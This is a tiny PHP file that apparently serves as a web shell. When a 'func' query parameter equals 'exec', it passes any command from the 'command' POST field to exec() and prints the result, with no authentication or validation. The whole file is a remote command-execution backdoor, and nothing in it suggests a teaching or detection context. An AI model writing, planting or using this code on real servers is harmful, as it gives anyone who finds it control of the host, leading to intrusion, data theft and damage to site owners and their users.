<?php
$execfunc = $_GET['func'];
if  ($_POST['command'] )  {
	if ($execfunc=="exec") {
		$result = exec($_POST['command']);
		echo $result;
	}
}
?>